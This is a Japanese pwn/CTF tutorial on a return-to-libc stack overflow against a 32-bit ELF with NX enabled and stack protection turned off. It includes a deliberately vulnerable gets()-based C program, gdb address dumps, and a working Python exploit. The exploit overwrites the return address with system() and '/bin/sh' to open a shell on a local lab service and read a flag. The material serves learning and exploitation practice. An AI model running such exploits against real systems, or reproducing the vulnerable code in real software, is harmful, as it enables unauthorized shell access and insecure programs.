# PWNオーバーフロー入門: NX有効の状況で関数の戻り番地を書き換えてシェルコードを実行(SSP、ASLR、PIE無効で32bitELF)

## 脆弱性のあるコード

[saru2017/pwn003: PWNオーバーフロー入門: 関数の戻り番地を書き換えてシェルコードを実行(SSP、ASLR、PIE、NX無効で32bitELF)](https://github.com/saru2017/pwn003)のコードをそのまま利用する予定。

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void saru()
{
  char buf[128];

  gets(buf);
  puts(buf);
}

int main(){
  saru();

  return 0;
}
```

コンパイルはSSPだけ無効に

```bash-statement
saru@lucifen:~/pwn004$ gcc -m32 -fno-stack-protector overflow04.c -o overflow04
overflow04.c: In function ‘saru’:
overflow04.c:9:3: warning: implicit declaration of function ‘gets’; did you mean ‘fgets’? [-Wimplicit-function-declaration]
   gets(buf);
   ^~~~
   fgets
/tmp/ccwtcIqy.o: In function `saru':
overflow04.c:(.text+0x20): warning: the `gets' function is dangerous and should not be used.
saru@lucifen:~/pwn004$ 
```

## リンクしてるライブラリを確認

```bash-statement
saru@lucifen:~/pwn004$ ldd ./overflow04
        linux-gate.so.1 (0xf7fd4000)
        libc.so.6 => /lib32/libc.so.6 (0xf7dea000)
        /lib/ld-linux.so.2 (0xf7fd6000)
saru@lucifen:~/pwn004$
```

## systemシステムコールの挙動を確認

systemでシェルを呼び出すだけの関数

```c
#include <stdio.h>

int main()
{
  system("/bin/sh");
  return 0;
}
```

コンパイル

```bash-statement
saru@lucifen:~/pwn004$ gcc -m32 -fno-stack-protector -no-pie test_system.c
test_system.c: In function ‘main’:
test_system.c:5:3: warning: implicit declaration of function ‘system’ [-Wimplicit-function-declaration]
   system("/bin/sh");
   ^~~~~~
saru@lucifen:~/pwn004$ 
```
gdb-pedaで挙動を確認

```
[------------------------------------stack-------------------------------------]
0000| 0xffffd4e0 --> 0x80484f0 ("/bin/sh")
0004| 0xffffd4e4 --> 0xffffd5a4 --> 0xffffd6e6 ("/home/saru/pwn004/a.out")
0008| 0xffffd4e8 --> 0xffffd5ac --> 0xffffd6fe ("LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc"...)
0012| 0xffffd4ec --> 0x804843a (<main+20>:      add    eax,0x1bc6)
0016| 0xffffd4f0 --> 0xffffd510 --> 0x1
0020| 0xffffd4f4 --> 0x0
0024| 0xffffd4f8 --> 0x0
0028| 0xffffd4fc --> 0xf7e05e81 (<__libc_start_main+241>:       add    esp,0x10)
[------------------------------------------------------------------------------]
```

- 0x080484f0に/bin/bashが詰まれている。

## いろんな情報を調べる

- 0xffffd4dc: return address
- 0x080482e0: system
- 0xffffd450: buf 

生状態

- system = 0xf7e29d10
- puts = 0xf7e54360
- buf = 0xffffd4a0

gdb経由

- system = 0xf7e29d10
- puts = 0xf7e54360
- buf = 0xffffd460

telnet経由

- system = 0xf7e29d10
- puts = 0xf7e54360
- buf = 0xffffd470


生の方が64バイトでかい

他のプログラムで調べても

- system = 0xf7e29d10
- puts = 0xf7e54360

が出てくる。

## exploitコードを試す

### exploitコード

```python
import socket
import time
import struct
import telnetlib



def main():
    buf = b'A' * 140
    buf += struct.pack('<I', 0xf7e29d10)
    buf += b'A' * 4
    buf += struct.pack('<I', 0xffffd470 + 140 + 12)
    buf += b'/bin/sh'

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(("localhost", 28080))
    time.sleep(1)
    print(buf)
    sock.sendall(buf)

    print("interact mode")
    t = telnetlib.Telnet()
    t.sock = sock
    t.interact()



if __name__ == "__main__":
    main()
```


### 実行結果

```bash-statement
saru@lucifen:~/pwn004$ python exploit04.py
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x10\x9d\xe2\xf7AAAA\x08\xd5\xff\xff/bin/sh'
interact mode

cat flag.txt
flag is HANDAI_CTF

exit
*** Connection closed by remote host ***
saru@lucifen:~/pwn004$
```

## 疑問

system、puts、bufのアドレスはどうやって調べるんだ？

ぱっと思いつくのだとsystem、putsは同じ設定のプログラムをコンパイルしてアドレスを割り出して、bufのアドレスはgdbで動かした結果から推測しつつ総当たり？




## 参考サイト

- [Return-to-libcでDEPを回避してみる - ももいろテクノロジー](http://inaz2.hatenablog.com/entry/2014/03/23/233759)
- [Return-to-libcで連続して関数を呼んでみる - ももいろテクノロジー](http://inaz2.hatenablog.com/entry/2014/03/24/020347)
- [Return-oriented Programming (ROP) でDEPを回避してみる - ももいろテクノロジー](http://inaz2.hatenablog.com/entry/2014/03/26/014509)
